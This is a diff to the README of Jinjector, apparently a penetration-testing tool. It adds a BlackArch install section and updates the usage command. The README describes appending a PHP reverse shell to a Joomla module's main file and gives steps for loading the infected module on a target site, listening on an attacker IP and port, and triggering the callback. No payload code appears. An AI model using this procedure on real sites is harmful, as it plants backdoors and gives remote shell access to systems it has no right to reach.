@@ -28,19 +28,27 @@ cd cmd
 go build -o jinjector
 ```
 
+## 🐧 BlackArch 
+
+This tool is now officially available in the <a href="https://github.com/BlackArch/blackarch/">BlackArch repository</a>! For security researchers, ethical hackers, and developers using BlackArch, you can install it directly via the system package manager:
+
+```bash
+sudo pacman -S jinjector
+```
+
 ## 🚀 Usage
 1. Run the program 
-```
-jinjector --ip=YOUR_IP --port=YOUR_PORT --path=YOUR_PATH --backdoor=BACKDOOR_PATH
+```bash
+jinjector --ip=YOUR_IP --port=YOUR_PORT --module=MODULE_PATH --backdoor=BACKDOOR_PATH
 ```
 2. Load the infected module on the target site 
 3. Start an http client on the port your gave in the previous step
 4. Trigger the module by sendign a request to its position
 
 ## 🌍 How It Works 
-**Manifest Extraction**: Jinjector parses the XML file in the given module directory to identify the main PHP file.
-**Payload Injection**: Once located, it appends a PHP reverse shell payload to the main file.
-**Connection Setup**: Every time the infected Joomla module is used, it attempts to establish a connection to your IP and port.
+**Manifest Extraction**: Jinjector parses the XML file in the given module directory to identify the main PHP file. <br/>
+**Payload Injection**: Once located, it appends a PHP reverse shell payload to the main file. <br/>
+**Connection Setup**: Every time the infected Joomla module is used, it attempts to establish a connection to your IP and port. <br/>
 
 ## ⚡️ Reverse Shell Code
 The reverse shell code injected is just a proof of concept, designed to open a connection to the specified IP and port. You can modify the payload if needed for specific testing purposes (backdoor.php file)
